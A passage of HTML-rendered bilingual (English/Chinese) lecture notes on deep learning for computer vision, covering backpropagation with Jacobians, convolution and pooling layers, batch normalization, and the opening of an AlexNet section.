</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-cs-cv-lec5-__codelineno-0-9"></a>    <span class="n">grad_s3</span><span class="o">=</span><span class="n">sigmoid_grad</span><span class="p">(</span><span class="n">L</span><span class="p">)</span><span class="o">*</span><span class="n">grad_L</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-cs-cv-lec5-__codelineno-0-10"></a>    <span class="n">grad_w2</span><span class="o">=</span><span class="n">grad_s3</span><span class="c1"># add gate distributes the gradient</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-cs-cv-lec5-__codelineno-0-11"></a>    <span class="n">grad_s2</span><span class="o">=</span><span class="n">grad_s3</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-cs-cv-lec5-__codelineno-0-12"></a>    <span class="n">grad_s0</span><span class="o">=</span><span class="n">grad_s2</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#note-cs-cv-lec5-__codelineno-0-13"></a>    <span class="n">grad_s1</span><span class="o">=</span><span class="n">grad_s2</span>
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#note-cs-cv-lec5-__codelineno-0-14"></a>    <span class="n">grad_w1</span><span class="o">=</span><span class="n">grad_s1</span><span class="o">*</span><span class="n">x1</span><span class="c1"># multiply gate swaps the gradient</span>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#note-cs-cv-lec5-__codelineno-0-15"></a>    <span class="n">grad_x1</span><span class="o">=</span><span class="n">grad_s1</span><span class="o">*</span><span class="n">w1</span>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#note-cs-cv-lec5-__codelineno-0-16"></a>    <span class="n">grad_w0</span><span class="o">=</span><span class="n">grad_s0</span><span class="o">*</span><span class="n">x0</span>
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#note-cs-cv-lec5-__codelineno-0-17"></a>    <span class="n">grad_x0</span><span class="o">=</span><span class="n">grad_s0</span><span class="o">*</span><span class="n">w0</span>
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#note-cs-cv-lec5-__codelineno-0-18"></a>
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#note-cs-cv-lec5-__codelineno-0-19"></a>    <span class="k">return</span> <span class="n">L</span><span class="p">,</span><span class="n">grad_w0</span><span class="p">,</span><span class="n">grad_x0</span><span class="p">,</span><span class="n">grad_w1</span><span class="p">,</span><span class="n">grad_x1</span><span class="p">,</span><span class="n">grad_w2</span>
</span></code></pre></div>
<h2 id="note-cs-cv-lec5-backprop-with-vectors-and-matrices">Backprop with vectors and matrices<a class="headerlink" href="#note-cs-cv-lec5-backprop-with-vectors-and-matrices" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-cv-lec5-backprop-with-vectors">Backprop with vectors<a class="headerlink" href="#note-cs-cv-lec5-backprop-with-vectors" title="Permanent link">&para;</a></h3>
<p><span class="arithmatex">\(x \in \mathbb{R},y \in \mathbb{R}\)</span></p>
<div class="arithmatex">\[
    \dfrac{\partial y}{\partial x} \in \mathbb{R}
\]</div>
<p><span class="arithmatex">\(x \in \mathbb{R}^n,y \in \mathbb{R}\)</span></p>
<div class="arithmatex">\[
    \dfrac{\partial y}{\partial x} \in \mathbb{R}^n
\]</div>
<p><span class="arithmatex">\(x \in \mathbb{R}^n,y \in \mathbb{R}^m\)</span></p>
<div class="arithmatex">\[
    \dfrac{\partial y}{\partial x} \in \mathbb{R}^{n \times m}
\]</div>
<p>for example,<span class="arithmatex">\(\mathbf{x}=(x_1,x_2,x_3)\)</span>,<span class="arithmatex">\(\mathbf{y}=(y_1,y_2)\)</span></p>
<p>the Jacobian matrix is <span class="arithmatex">\(3 \times 2\)</span> matrix.</p>
<div class="arithmatex">\[
  \frac{\partial y}{\partial x} = \begin{bmatrix}
      \frac{\partial y_1}{\partial x_1} &amp; \frac{\partial y_2}{\partial x_1}\\
      \frac{\partial y_1}{\partial x_2} &amp; \frac{\partial y_2}{\partial x_2}\\
      \frac{\partial y_1}{\partial x_3} &amp; \frac{\partial y_2}{\partial x_3}
  \end{bmatrix}
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>其实在数学上，如果<span class="arithmatex">\(y\)</span>是<span class="arithmatex">\(m\)</span>维，<span class="arithmatex">\(x\)</span>是<span class="arithmatex">\(n\)</span>维，那么传统的Jacobian 矩阵的形状经常写为 <span class="arithmatex">\(\frac{\partial y}{\partial x} \in \mathbb{R}^{m \times n}\)</span>的。但是在这里，由于反向传播的链式法则的写法是</p>
<div class="arithmatex">\[
    \frac{\partial L}{\partial x} = \frac{\partial y}{\partial x} \frac{\partial L}{\partial y}
\]</div>
<p>而不是传统的</p>
<div class="arithmatex">\[
    \frac{\partial L}{\partial x} = \frac{\partial L}{\partial y} \frac{\partial y}{\partial x}
\]</div>
<p>在一维的情况下，由于乘法可以交换，所以两种写法是等价的。但是在多维的情况下，要想反转这种顺序，就需要给矩阵加上转置。</p>
<p>所以我们把Jacobian 矩阵的形状写为 <span class="arithmatex">\(\frac{\partial y}{\partial x} \in \mathbb{R}^{n \times m}\)</span>的。</p>
<p>记忆Jacobian形状也根据链式法则的写法来记忆，即如果是第一种<span class="arithmatex">\(\frac{\partial L}{\partial x} =  \frac{\partial L}{\partial x}\frac{\partial L}{\partial L}\)</span>，所以是L的形状在后面，</p>
<p>如果是第二种<span class="arithmatex">\(\frac{\partial L}{\partial x} =  \frac{\partial L}{\partial x}\frac{\partial x}{\partial x}\)</span>，所以是x的形状在后面。</p>
</div>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec5-8.png" width="400" />

<figcaption>Sketch</figcaption>
</figure>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/CS/CV/img/lec5-9.png" width="400" />
<figcaption>ReLU</figcaption>
</figure></p>
<p>for the ReLU function, if we have a 4D input <span class="arithmatex">\(x=(1,-2,3,-1)\)</span>,</p>
<p>the output is <span class="arithmatex">\(y=(1,0,3,0)\)</span>.</p>
<p>the Jacobian matrix is</p>
<div class="arithmatex">\[
    \frac{\partial y}{\partial x} = \begin{bmatrix}
        1 &amp; 0 &amp; 0 &amp; 0\\
        0 &amp; 0 &amp; 0 &amp; 0\\
        0 &amp; 0 &amp; 1 &amp; 0\\
        0 &amp; 0 &amp; 0 &amp; 0
    \end{bmatrix}
\]</div>
<p>the upstream gradient is <span class="arithmatex">\(\frac{\partial L}{\partial y}=(4,-1,5,9)\)</span>,</p>
<p>so the downstream gradient is</p>
<div class="arithmatex">\[
    Jacobian \times upstream \ gradient = \begin{bmatrix}
        1 &amp; 0 &amp; 0 &amp; 0\\
        0 &amp; 0 &amp; 0 &amp; 0\\
        0 &amp; 0 &amp; 1 &amp; 0\\
        0 &amp; 0 &amp; 0 &amp; 0
    \end{bmatrix} \times \begin{bmatrix}
        4\\-1\\5\\9
    \end{bmatrix} = \begin{bmatrix}4\\0\\5\\0\end{bmatrix}
\]</div>
<p>we can see that the jacobian matrix is a sparse matrix, which is a good property for computing by human but not for computer,if we want to compute high dimensional input, the Jacobian matrix will be too large to handle.</p>
<p>so it is important to come up with some tricks to make the computation more efficient.</p>
<p>For the ReLU function, we can use the following trick:</p>
<div class="arithmatex">\[
   \left(\frac{\partial L}{\partial x}\right)_{i} = \begin{cases}
       \left(\frac{\partial L}{\partial y}\right)_{i} &amp; x_{i} &gt; 0\\
       0 &amp; x_{i} \leq 0
   \end{cases}
\]</div>
<p>and we can get the downstream gradient directly from the upstream gradient, without computing the Jacobian matrix.</p>
</div>
<h3 id="note-cs-cv-lec5-backprop-with-matrices">Backprop with matrices<a class="headerlink" href="#note-cs-cv-lec5-backprop-with-matrices" title="Permanent link">&para;</a></h3>
<blockquote>
<p>or tensors</p>
</blockquote>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec5-10.png" width="400" />

<figcaption>Matrix</figcaption>
</figure>
<p>when we compute backprop with matrices,the jacobian matrix is a 4D tensor,which is very hard to handle.so we need to use some tricks to make the computation more efficient.</p>
<p>One simple way is to compute the gradient element-wise.</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec5-11.png" width="400" />

<figcaption>example</figcaption>
</figure>
<div class="arithmatex">\[
    \frac{d L}{d x_{11}} = \frac{d y}{d x_{11}} \frac{d L}{d y}
\]</div>
<p><span class="arithmatex">\(\frac{d y}{d x_{11}}\)</span> is a 2D matrix,</p>
<div class="arithmatex">\[
    \frac{d y}{d x_{11}} = \begin{bmatrix}
        \frac{d y_{11}}{d x_{11}} &amp; \frac{d y_{12}}{d x_{11}} &amp;\frac{d y_{13}}{d x_{11}} &amp; \frac{d y_{14}}{d x_{11}} \\
        \frac{d y_{21}}{d x_{11}} &amp; \frac{d y_{22}}{d x_{11}} &amp; \frac{d y_{23}}{d x_{11}} &amp; \frac{d y_{24}}{d x_{11}} 
    \end{bmatrix} = \begin{bmatrix}
       W_1\\
       \mathbf{0}
    \end{bmatrix}
\]</div>
<p>So  </p>
<div class="arithmatex">\[
    \frac{d L}{d x_{11}}=\frac{d L}{d x_{11}} \cdot \frac{d L}{d y}=3
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>这里进行的是inner product,而不是矩阵乘法。即两个矩阵对应元素相乘后的结果。可以类比2维矩阵相乘的时候，结果矩阵的第i行第j列的元素是两个矩阵的第i行和第j列的内积。</p>
<p>那么对于<span class="arithmatex">\([(D_x \times D_y) \times (D_z \times M_z)]\)</span>的张量与<span class="arithmatex">\([D_z \times M_z]\)</span>的矩阵进行乘法的时候，结果张量的形状是<span class="arithmatex">\([D_x \times D_y]\)</span>的，其第i行第j列的元素是第一个张量第ij位置的矩阵与第二个矩阵的乘积。</p>
</div>
<p>Similarly</p>
<p><span class="arithmatex">\(\frac{d y}{d x_{ij}}\)</span> is a 2D matrix,where the i-th row is the j-row of <span class="arithmatex">\(W\)</span> other rows are all zero.</p>
<p>And we can get the downstream gradient directly from the upstream gradient  and the matrix <span class="arithmatex">\(W\)</span> with:</p>
<div class="arithmatex">\[
    \frac{d L}{d x} = \frac{d L}{d y} W^\mathtt{T}
\]</div>
<p>it seems a little bit confusing,but </p>
<p>$ \frac{d L}{d x} \in \mathbb{R}^{N \times D}$</p>
<p>$ \frac{d L}{d y} \in \mathbb{R}^{N \times M}$</p>
<p>$ W \in \mathbb{R}^{D \times M}$</p>
<p>SO this format is the only way to make the matrix multiplication work.</p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>这不是反向传播的一种形式，而是一种用于计算的推论</p>
</div>
<p>We can also use the backprop to compute the hige-order derivatives.</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/img/lec5-12.png" width="400" />

<figcaption>example</figcaption>
</figure></section><section class="print-page" id="note-cs-cv-lec6" heading-number="2.4.5.7"><h1 id="note-cs-cv-lec6-convolutional-neural-networks">Convolutional Neural Networks<a class="headerlink" href="#note-cs-cv-lec6-convolutional-neural-networks" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2122 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 16 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 7 分钟</p>
</div>
<h2 id="note-cs-cv-lec6-convolution-layer">Convolution  Layer<a class="headerlink" href="#note-cs-cv-lec6-convolution-layer" title="Permanent link">&para;</a></h2>
<p>Neither Linearclassifier nor the two dimensional nenueral network respect the spatial structure on images!</p>
<p>they convert the 3x32x32 image into a 3072x1 vector.Stretch pixels into column.</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec6-1.png" width="500" />
</figure>
<p>A convolutional layer applies a set of filters to the input image.</p>
<h3 id="note-cs-cv-lec6-single-filter">single filter<a class="headerlink" href="#note-cs-cv-lec6-single-filter" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec6-2.png" width="500" />
</figure>
<blockquote>
<p>对于一个3x32x32的图像，如果使用1个3x5x5的filter，对于每一个位置，会进行一个3x5x5=75的两个张量的内积运算再加上一个bias，然后得到一个值。对应到输出图像的一个位置。所以输出维度是1x28x28。</p>
</blockquote>
<h3 id="note-cs-cv-lec6-multiple-filters">multiple filters<a class="headerlink" href="#note-cs-cv-lec6-multiple-filters" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec6-3.png" width="500" />
</figure>
<blockquote>
<p>对于一个3x32x32的图像，如果使用6个3x5x5的filter，对于每一个位置，会进行一个3x5x5=75的两个张量的内积运算再加上一个bias，然后得到一个值。对应到输出图像的一个位置。这样的操作会进行6次，所以输出维度是6x28x28。有六个filter张量，当然也会有一个6维的bias。</p>
</blockquote>
<p>For the output of the convolutional layer, we can consider them as</p>
<ul>
<li>6 activation maps,each 1x28x28</li>
<li>28x28 grid,at each point,6-dimensional vector</li>
</ul>
<h3 id="note-cs-cv-lec6-multiple-input">Multiple input<a class="headerlink" href="#note-cs-cv-lec6-multiple-input" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec6-4.png" width="500" />
</figure>
<blockquote>
<p>对于2个3x32x32的图像，如果使用6个3x5x5的filter，对于每一个位置，会进行一个3x5x5=75的两个张量的内积运算再加上一个bias，然后得到一个值。对应到输出图像的一个位置。这样的操作会进行6次，有2个输入，所以输出维度是2x6x28x28。有六个filter张量，当然也会有一个6维的bias。</p>
</blockquote>
<p>Summary</p>
<ul>
<li>input <span class="arithmatex">\(N \times C_{in} \times H \times W\)</span></li>
<li>filter <span class="arithmatex">\(C_{out} \times C_{in} \times k \times k\)</span></li>
<li>bias <span class="arithmatex">\(C_{out}\)</span></li>
<li>output <span class="arithmatex">\(N \times C_{out} \times H' \times W'\)</span></li>
</ul>
<p><span class="arithmatex">\(C_{in}\)</span> will disappear in the output since it is the same in the input and the filter.</p>
<h3 id="note-cs-cv-lec6-connect-multiple-hidden-layers">Connect multiple hidden layers<a class="headerlink" href="#note-cs-cv-lec6-connect-multiple-hidden-layers" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec6-5.png" width="500" />
</figure>
<blockquote>
<p>通过依次过滤之后得到一些activation maps，然后把这些activation maps作为输入，再进行过滤，得到更多的activation maps。如果中间只是简单的连接，那么完全可以用另外一些filters来代替，因为这一过程仍然是线性的。
所以需要激活函数(eg.ReLU)来引入非线性。这样的连接才会make sense。</p>
</blockquote>
<div class="admonition info">
<p class="admonition-title">what do convolutional filters learn</p>
<ul>
<li>
<p>for linear classifier,the weight matrix(C,D);each row could reshape as a template image.多少种类别就有多少个模板。</p>
</li>
<li>
<p>for neural network,the weight matrix W1(H,D);each row could reshape as a  Bank of whole-image templates与Hidden Layer H个神经元一一对应。</p>
</li>
<li>
<p>for convolutional neural network, local image templates (Often learns oriented edges, opposing colors)，表现局部特征</p>
</li>
</ul>
<p><figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec6-6.png" width="500" />
</figure></p>
<blockquote>
<p>AlexNet: 64 filters,each3x11x11</p>
</blockquote>
</div>
<h3 id="note-cs-cv-lec6-padding">padding<a class="headerlink" href="#note-cs-cv-lec6-padding" title="Permanent link">&para;</a></h3>
<p>For input size <span class="arithmatex">\(W\times W\)</span>,filter size <span class="arithmatex">\(k\times k\)</span></p>
<p>The output size is <span class="arithmatex">\((W-k+1)\times (W-k+1)\)</span></p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec6-7.png" width="500" />
</figure>
<blockquote>
<p>This is a problem because the output size is smaller and smaller.</p>
</blockquote>
<p>By adding additional pixels around the input image(usually 0 padding), we can control the output size.</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec6-8.png" width="500" />
</figure>
<p>Therefore, the output size is </p>
<div class="arithmatex">\[
    (W-k+2P+1) \times (W-k+2P+1)
\]</div>
<h3 id="note-cs-cv-lec6-receptive-field">Receptive Field<a class="headerlink" href="#note-cs-cv-lec6-receptive-field" title="Permanent link">&para;</a></h3>
<p>在卷积神经网络（CNN）中，激活的感受野（receptive field）是指输入图像中对某个激活值影响最大的区域。换句话说，感受野是指在输入图像中，某个特定的神经元（或激活值）能够“看到”或“感知到”的那一部分区域。感受野的大小和位置会影响神经网络对图像特征的提取和理解。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec6-9.png" width="500" />
</figure>
<blockquote>
<p>输出图像的某一个点，是由以输入图像对应点为中心的<span class="arithmatex">\(K \times K\)</span>的区域决定的。<span class="arithmatex">\(K\)</span>是filter的尺寸。</p>
</blockquote>
<p>Each successive convolution adds <span class="arithmatex">\(K – 1\)</span> to the receptive field size
With <span class="arithmatex">\(L\)</span> layers the receptive field size is <span class="arithmatex">\(1 + L * (K – 1)\)</span></p>
<p>这个也不难理解，以上图最后的输出图像的中心位置的元素为例(假设其为C3，有C2，C1，C0)，它在前一层C2的感受野是<span class="arithmatex">\(K \times K\)</span>，而这<span class="arithmatex">\(K \times K\)</span>的区域的感受野是C3区域中，中心位于其中的filter的感受野，要考虑其大小，只需要在四个角扩展边长即可，边长会增加<span class="arithmatex">\((K-1)/2 * 2=K-1\)</span>.</p>
<p>所以对于<span class="arithmatex">\(L\)</span>层，感受野的大小是<span class="arithmatex">\(1\)</span>(末层感受野)+<span class="arithmatex">\(L*(K-1)\)</span>，(L次扩展)</p>
<p><span style="color:red">
Problem: For large images we need many layers for each output to “see” the whole image
</span></p>
<h3 id="note-cs-cv-lec6-stride">Stride<a class="headerlink" href="#note-cs-cv-lec6-stride" title="Permanent link">&para;</a></h3>
<p><span style="color:green">
 Solution: Downsample inside the network
</span></p>
<p>By increasing the stride, we extend the receptive field.</p>
<p>Now the output size should be </p>
<div class="arithmatex">\[
    \left\lfloor \frac{W-k+2P}{S} \right\rfloor + 1
\]</div>
<blockquote>
<p>1是一开始的位置，<span class="arithmatex">\((W-k+2P)/S\)</span>是接下来可选的位置。</p>
</blockquote>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>Input volume: 3 x 32 x 32, 10 3x5x5 filters with stride 1, pad 2</p>
<p>Output volume: 10x((32-5+2*2)/1+1)=10x32x32 (Whoa,same size!)</p>
<p>Number of learnable parameters:</p>
<ul>
<li>Parameters per filter: <span class="arithmatex">\(5 \times 5 \times 3 + 1 = 76\)</span></li>
<li>Total: <span class="arithmatex">\(10 \times 76 = 760\)</span></li>
</ul>
<p>Number of multiply-add operations:</p>
<div class="arithmatex">\[
    10 \times 32 \times 32 \times 75 \times 2 = 768k
\]</div>
</div>
<details class="note">
<summary>Other types of convolution</summary>
<p>目前为止看到的是2D的卷积，实际上还有1D和3D的卷积。</p>
<p>1D的卷积：</p>
<ul>
<li>输入：<span class="arithmatex">\(C_{in} \times L\)</span></li>
<li>输出：<span class="arithmatex">\(C_{out} \times (L-K+1)\)</span></li>
<li>参数：<span class="arithmatex">\(C_{out} \times C_{in} \times K\)</span>
<figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec6-10.png" width="400" />
</figure><blockquote>
<p>对于一个输入，一个filter对这个输入操作完后只会得到一个Vector，然后多个filter就会得到多个Vector</p>
</blockquote>
</li>
</ul>
<p>3D的卷积：</p>
<ul>
<li>输入：<span class="arithmatex">\(C_{in} \times H \times W \times D\)</span></li>
<li>输出：<span class="arithmatex">\(C_{out} \times (H-K+1) \times (W-K+1) \times (D-K+1)\)</span></li>
<li>参数：<span class="arithmatex">\(C_{out} \times C_{in} \times K \times K \times K\)</span>
<figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec6-11.png" width="400" />
</figure><blockquote>
<p>实际上已经可以总结出卷积之后的维度取决于filter在输入上移动的自由度</p>
</blockquote>
</li>
</ul>
</details>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
<ul>
<li>Input: <span class="arithmatex">\(C_{in} \times H \times W\)</span></li>
<li>Hyperparameters:<ul>
<li>Kernel size: <span class="arithmatex">\(K_H \times K_W\)</span> </li>
<li>Number of filters: <span class="arithmatex">\(C_{out}\)</span></li>
<li>Padding: <span class="arithmatex">\(P\)</span></li>
<li>Stride: <span class="arithmatex">\(S\)</span></li>
</ul>
</li>
<li>Weight matrix: <span class="arithmatex">\(C_{out} \times C_{in} \times K_H \times K_W\)</span> (giving <span class="arithmatex">\(C_{out}\)</span> filters of size <span class="arithmatex">\(C_{in} \times K_H \times K_W\)</span>)</li>
<li>Bias vector: <span class="arithmatex">\(C_{out}\)</span></li>
<li>
<p>Output size: <span class="arithmatex">\(C_{out} \times H' \times W'\)</span> where:</p>
<div class="arithmatex">\[
    H' = \frac{H - K + 2P}{S} + 1
\]</div>
<div class="arithmatex">\[
W' = \frac{W - K + 2P}{S} + 1
\]</div>
</li>
</ul>
</div>
<h2 id="note-cs-cv-lec6-pooling-layers">Pooling Layers<a class="headerlink" href="#note-cs-cv-lec6-pooling-layers" title="Permanent link">&para;</a></h2>
<p>Pooling layer is a downsampling layer.</p>
<p>在卷积神经网络（CNN）中，池化（Pooling）层是一种下采样层，用于减少特征图的尺寸，同时保留重要的特征信息。池化层的主要目的是降低计算复杂度、减少内存使用，并在一定程度上控制过拟合。</p>
<h3 id="note-cs-cv-lec6-types-of-pooling">Types of Pooling<a class="headerlink" href="#note-cs-cv-lec6-types-of-pooling" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>Max Pooling</strong>：</li>
<li>在一个池化窗口内选择最大值作为输出。</li>
<li>这种方法可以保留最显著的特征。</li>
</ul>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec6-12.png" width="400" />
</figure>
<ul>
<li><strong>Average Pooling</strong>：</li>
<li>在一个池化窗口内计算平均值作为输出。</li>
<li>这种方法可以平滑特征图。</li>
</ul>
<h3 id="note-cs-cv-lec6-parameters-of-pooling">Parameters of Pooling<a class="headerlink" href="#note-cs-cv-lec6-parameters-of-pooling" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>池化窗口大小（Kernel Size）</strong>：定义了池化操作的区域大小。</li>
<li><strong>步幅（Stride）</strong>：定义了池化窗口在特征图上移动的步长。</li>
<li><strong>填充（Padding）</strong>：有时会在特征图的边缘添加额外的像素，以便池化窗口可以完全覆盖特征图。</li>
</ul>
<h3 id="note-cs-cv-lec6-effect-of-pooling">Effect of Pooling<a class="headerlink" href="#note-cs-cv-lec6-effect-of-pooling" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>降维</strong>：通过减少特征图的尺寸，降低了模型的计算复杂度。</li>
<li><strong>特征不变性</strong>：通过池化操作，模型对输入的微小变化（如平移、旋转）具有更强的鲁棒性。</li>
<li><strong>防止过拟合</strong>：通过减少参数数量，降低了模型过拟合的风险。</li>
</ul>
<p>池化层通常在卷积层之后使用，以便在提取特征后进行下采样。</p>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
<p>Key characteristics of pooling layers:</p>
<ul>
<li><strong>Input size</strong>: <span class="arithmatex">\(C \times H \times W\)</span></li>
<li><strong>Hyperparameters</strong>:<ul>
<li>Kernel size: <span class="arithmatex">\(K\)</span></li>
<li>Stride: <span class="arithmatex">\(S\)</span></li>
<li>Pooling function: max pooling or average pooling</li>
</ul>
</li>
<li>
<p><strong>Output size</strong>: <span class="arithmatex">\(C \times H' \times W'\)</span> where:</p>
<div class="arithmatex">\[
H' = \frac{H - K}{S} + 1
\]</div>
<div class="arithmatex">\[
W' = \frac{W - K}{S} + 1
\]</div>
</li>
<li>
<p><strong>Learnable parameters</strong>: None</p>
</li>
</ul>
<p>实际上是与卷积filter的作用是类似的，都是把一个局部映射成一个值来缩小，但池化比较EZ。且池化不会改变通道数。</p>
</div>
<details class="example">
<summary>Example</summary>
<p><img alt="" src="../NOTE/CS/CV/img/lec6-13.png" />
in fact,the max pooling already add some non-linearity to the network,some after this, if we don't use ReLU,the result is still correct.</p>
</details>
<h2 id="note-cs-cv-lec6-batch-normalization">Batch Normalization<a class="headerlink" href="#note-cs-cv-lec6-batch-normalization" title="Permanent link">&para;</a></h2>
<p>Idea: “Normalize” the outputs of a layer so they have zero mean and unit variance</p>
<p>Why？<span style="color:red">Because Deep Networks are very hard to train!</span></p>
<p>进行批量归一化（Batch Normalization）的主要原因是为了减少“内部协变量偏移”（internal covariate shift），从而改善模型的优化过程。具体来说，批量归一化通过将每一层的输出标准化为零均值和单位方差，来稳定和加速神经网络的训练过程。这种标准化操作是可微的，因此可以在网络中作为一个操作符使用，并通过反向传播进行训练。</p>
<p>具体来说</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec6-14.png" width="400" />
</figure>
<div class="arithmatex">\[
    x \in \mathbb{R}^{N \times D}
\]</div>
<div class="arithmatex">\[
    \mu_j = \frac{1}{m} \sum_{i=1}^{m} x_{ij}
\]</div>
<p>(Running) average of values seen during training</p>
<div class="arithmatex">\[
    \sigma^2_j = \frac{1}{m} \sum_{i=1}^{m} (x_{ij} - \mu_j)^2
\]</div>
<p>(Running) average of values seen during training</p>
<div class="arithmatex">\[
    \hat{x}_{ij} = \frac{x_{ij} - \mu_j}{\sqrt{\sigma^2_j + \epsilon}}
\]</div>
<blockquote>
<p><span class="arithmatex">\(\epsilon\)</span> is a small constant to avoid division by zero.</p>
</blockquote>
<div class="arithmatex">\[
    y_{ij} = \gamma_j \hat{x}_{ij} + \beta_j
\]</div>
<blockquote>
<p><span class="arithmatex">\(\gamma\)</span> and <span class="arithmatex">\(\beta\)</span> are learnable parameters,when <span class="arithmatex">\(\gamma=\sigma\)</span> and <span class="arithmatex">\(\beta=\mu\)</span>,the output is the same as the input.</p>
</blockquote>
<p>上面展示的是按Batch的计算，即按样本计算,最后会得到<span class="arithmatex">\(1 \times D\)</span>的均值和方差张量，然后进行广播，得到<span class="arithmatex">\(N \times D\)</span>的均值和方差张量。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec6-15.png" width="300" />
</figure>
<p>还有按layer和Instance的计算</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec6-16.png" width="400" />

<figcaption>
   the elements that are highlighted are the elements used to compute the mean and variance.
</figcaption>
</figure></section><section class="print-page" id="note-cs-cv-lec7_8" heading-number="2.4.5.8"><h1 id="note-cs-cv-lec7_8-cnn-architectures-in-history">CNN Architectures in history<a class="headerlink" href="#note-cs-cv-lec7_8-cnn-architectures-in-history" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2980 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 22 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 10 分钟</p>
</div>
<h2 id="note-cs-cv-lec7_8-alexnet">AlexNet<a class="headerlink" href="#note-cs-cv-lec7_8-alexnet" title="Permanent link">&para;</a></h2>
<p>AlexNet 是一种深度卷积神经网络（CNN）架构，由 Alex Krizhevsky、Ilya Sutskever 和 Geoffrey Hinton 在 2012 年开发。它在 ImageNet 大规模视觉识别挑战赛（ILSVRC）中取得了显著的成功，标志着深度学习在计算机视觉领域的突破。</p>
<figure>
